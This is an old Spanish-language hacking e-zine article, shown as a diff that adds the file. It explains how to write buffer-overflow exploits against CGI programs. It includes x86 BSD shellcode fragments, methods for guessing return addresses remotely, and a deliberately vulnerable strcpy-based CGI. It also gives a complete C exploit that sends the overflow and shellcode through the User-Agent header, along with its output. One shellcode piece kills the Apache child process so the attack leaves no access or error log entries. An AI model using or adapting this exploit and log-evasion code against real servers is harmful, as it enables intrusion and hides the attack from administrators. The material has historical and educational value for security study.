@@ -1,0 +1,262 @@
+ : :.:..:...:....:.....:......:.......:........:.........:..........: : : ::::
+ :      :                                      :                    :
+ RGZ_05 Escribiendo BOF exploits para CGIs     Hacking              ocsic
+ : :.:..:...:....:.....:......:.......:........:.........:..........: : : ::::
+
+
+Nota
++=+=
+
+    Para  leer esta guia  es necesario  tener conocimientos  sobre explotacion 
+    de buffer overflows.  Ademas esta guia no entrega  shellcodes solo intenta
+    mostrar las diferencias que hay al explotar CGIs.
+
+Consideraciones
++=+=+=+=+=+=+=+
+
+    La  especificion de  CGI, establece  una  forma de  comunicacion entre  el
+    programa CGI y el webserver. Al ejecutarse el CGI debe enviarse una cadena
+    de la forma  'Content-type: XXXX', donde XXXX es el  tipo de contenido que
+    el CGI  enviara al  webserver y seguido  de todos  los headers que  el CGI
+    necesite  establecer,  Ej:  Cookies,  Redirecciones,  etc.  Cuando  ya  no
+    necesita enviar  nada al webserver, envia  un CRLF y empieza  a enviar los
+    datos en  si. Entonces  al construir  un exploit en  un CGI,  es necesario 
+    enviar esa cadena  o el webserver dara error.  Agregando este codigo antes
+    de un shellcode, envia la cadena (todo los shellcodes son para BSD).
+    
+    char print_hdr[] = {
+        "\x31\xc0\x6a\x1b\xeb\x09\x6a\x01\x50\xb0\x04\xcd\x80\xeb\x21\xe8"
+        "\xf2\xff\xff\xffContent-type: text/html\r\n\r\n"
+    };
+    
+
+
+El problema de la pila
+=+=+=+=+=+=+=+=+=+=+=+
+    
+Al explotar  un BOF en una  aplicacion local obtenemos  un valor de la  pila a
+traves  de una  funcion get_esp()  o parecida,  esta funcion  nos da  un valor
+cercano  al que  tendra el  buffer a  explotar. Pero  en los  CGI  nosotros no
+podemos usar  esa funcion, ya  que la victima  es remota. Aqui voy  a explicar
+algunos metodos que pueden ser usados.
+    
+    Fuerza Bruta
+    =+=+=+=+=+=+
+        
+        Esto no hay que explicarlo mucho, solo recordar que en cada OS la pila
+    tiene una  direccion base (recuerda que  la pila crece hacia  abajo) y que
+    cada arquitectura trabaja con un tama~o de  datos, por ej: la i386 en modo
+    protegido trabaja con 4  bytes, entonces las direcciones siempre van a ser
+    multiplos  de 4. Ademas las variables de entorno se guardan en la pila asi
+    que la direccion va a ser mas baja entre mas  datos le hayas mandado a una
+    varible de entorno (HTTP_USER_AGENT, etc). 
+            
+
+    Variables Globales
+    =+=+=+=+=+=+=+=+=+
+
+       Las  variables globales  son guardadas  despues del  codigo, y  como el
+    codigo  no cambia  de tama~o,  las direcciones  de las  variables globales
+    tampoco cambian, asi que se pueden usar para ejecutar la shellcode.
+        
+
+    char UserAgent[256];
+    
+    main() {
+        char *ptr;
+        char buf[256];
+
+        strcpy(UserAgent, getenv(HTTP_USER_AGENT));
+        strcpy(buf, getparam("data"));
+    }
+
+
+        Solo habria que pasar la shellcode en el encabezado 'User-Agent' y la
+    direccion de la variable UserAgent como direccion de retorno.
+
+
+    Malloc
+    =+=+=+
+        
+        malloc()  permite guardar  dinamicamente  memoria para  el  uso de  la 
+    aplicacion.  malloc() internamente  utiliza las  funciones sbrk()  y brk()
+    para  conseguir memoria.  brk() establece  la direccion  mas baja  para el
+    segmento de datos. sbrk() incrementa la direccion base del segmento. 
+    Una aplicacion pidiendo datos de memoria seria asi
+                                   
+                ,---------------. --- 0x1000
+                |   Codigo      |
+                |   ejecutable  |
+                |               |
+                |---------------|---- 0x1040
+                |    Datos      |
+                |_______________|___ Pos mas baja, digamos 0x1080
+    
+    Entonces al hacer un brk(0x1090) esto queda asi
+
+                ,---------------. --- 0x1000
+                |   Codigo      |
+                |  ejecutable   |
+                |               |
+                |---------------|---- 0x1060
+                |    Datos      |
+              _ |_______________|___  0x1080
+             |  :               :
+         Heap|_ :...............:___ 0x1090
+    
+        Entonces nos queda 0x10 bytes de memoria donde podemos guardar datos.
+    Ahora digamos que tenemos un prog de este tipo.
+
+    main() {
+        char *ptr;
+        char buf[256];
+
+        ptr = malloc(stlren(getenv(HTTP_USER_AGENT)));
+        strcpy(ptr, getenv(HTTP_USER_AGENT));
+        strcpy(buf, getparam("data"));
+    }
+    
+    cada vez  que sea cargado, el  puntero 'ptr' tendra la  misma direccion en
+    memoria ya que el tama~o del programa no cambia, entonces solo tenemos que
+    usar 'ptr' como  direccion de retorno. Aqui se  necesita obviamente acceso
+    al binario para saber la posicion mas baja.  
+
+
+No dejar logs
++=+=+=+=+=+=+
+
+    Agregando este pedazo  de codigo a una shellcode (antes  del exit), nos da
+    la posibilidad de no dejar logs en los webservers Apache. 
+
+    char no_logs[14] = {
+        "\x6a\x27\x58\xcd\x80\x6a\x09\x50\x50\x6a\x25\x58\xcd\x80"
+    };
+
+
+    El webserver  al recibir una peticion  de conexion, crea  un nuevo proceso
+    para atenderla, entonces  si esta es a un CGI, crea  un nuevo proceso para
+    ese  CGI. El  webserver espera  a que  termine de  ejecutarse el  CGI para
+    escribir el log correspondiente, pero que pasa si lo matamos? no hay nadie
+    que escriba el log. Para entenderlo mejor aqui hay un esquema:
+
+                httpd 
+                  `-- httpd (hijo)
+                        `--- cgivul
+
+    el  shellcode que enviamos  a cgivul  mata al  httpd hijo,  el cual  es el
+    encargado de escribir  el log correspondiente. Por lo  tanto no se escribe
+    el log.
+
+Prueba
++=+=+=
+
+    Imaginemos un programa CGI vulnerable:
+
+<++> cgibof/cgivul.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+char agent[1024];
+
+void main()
+{
+	char buf[256];
+
+	printf("Content-type: text/html\r\n\r\n");
+	if(!getenv("QUERY_STRING"))
+		exit(0);
+	strcpy(agent, getenv("HTTP_USER_AGENT"));
+	strcpy(buf, getenv("QUERY_STRING"));
+	printf("%s\n", buf);
+}
+<-->
+
+    Lo compilamos y lo copiamos al directorio 'cgi-bin', ahora para explotarlo
+    necesitamos una  direccion de retorno, sabemos que  las variables globales
+    no cambian su  direccion, asi que buscamos la  direccion de 'agent' con la
+    ayuda del programa objdump, la cual es 0x2130.
+
+    Hacemos un peque~o shellcode que imprime:
+
+    Content-type: text/html
+
+    Exploited!
+
+    y al final le agregamos codigo para que no deje logs.
+    
+    
+
+<++> cgibof/exp_cgivul.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+char shellcode[] = {
+        "\x31\xc0\x6a\x26\xeb\x25\x5e\x56\xff\x4e\x18\xff\x4e\x1a\xff\x4e"
+        "\x25\x6a\x01\x50\xb0\x04\xcd\x80\x6a\x27\x58\xcd\x80\x6a\x09\x50"
+        "\x50\x6a\x25\x58\xcd\x80\x50\xb0\x01\xcd\x80\xe8\xd6\xff\xff\xff"
+        "\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x74\x79\x70\x65\x3a\x20\x74\x65"
+        "\x78\x74\x2f\x68\x74\x6d\x6c\x0d\x0b\x0d\x0b\x45\x78\x70\x6c\x6f"
+        "\x69\x74\x65\x64\x21\x0b"
+};
+
+void
+main()
+{
+	int i, fd;
+	char buf[300];
+	unsigned long addr = 0x2130;
+	struct sockaddr_in sa;
+	FILE *fp;
+	
+	for(i=0;i<260;i++)
+		buf[i] = 'A';
+	*((long *)&buf[i] ) = addr;
+
+	fd = socket(AF_INET, SOCK_STREAM, 0);
+
+	sa.sin_family = AF_INET;
+	sa.sin_port = htons(80);
+	sa.sin_addr.s_addr = inet_addr("127.0.0.1");
+
+	connect(fd, (struct sockaddr *) &sa, sizeof(sa));
+	fp = fdopen(fd, "r+");
+
+	fprintf(fp, "GET /cgi-bin/cgivul?%s HTTP/1.0\r\nUser-Agent: %s\r\n\r\n", buf, shellcode);
+	fflush(fp);
+		bzero(buf, sizeof(buf));
+	while(read(fd, buf, sizeof(buf) - 1)) {
+		puts(buf);
+		bzero(buf, sizeof(buf));
+	}
+}
+<-->
+
+    Si revisas el  shellcode notaras que hay 3  instrucciones decl 0x??(%esi), 
+    estas decrementas los bytes \x0b a \x0a (NL), ya que si lo pusieramos como
+    \x0a el  webserver lo tomaria como el  fin del header no  copiando todo el
+    shellcode. 
+
+    Ahora compilamos el exploit, y lo ejecutamos
+
+ocsic$ ./exp_cgivul
+HTTP/1.1 200 OK
+Date: Sun, 28 Oct 2001 15:06:08 GMT
+Server: Apache/1.3.12 (Unix) mod_ssl/2.6.6 OpenSSL/0.9.5a
+Connection: close
+Content-Type: text/html
+
+Exploited!
+
+ocsic$ 
+
+    revisamos la  ultima entrada en el  access_log y vemos que  no fue escrita
+    la peticion a /cgi-bin/cgivul, revisamos el error_log y nada.
+
+_EOF_
+
+
+
+<<::RareGaZz::>>
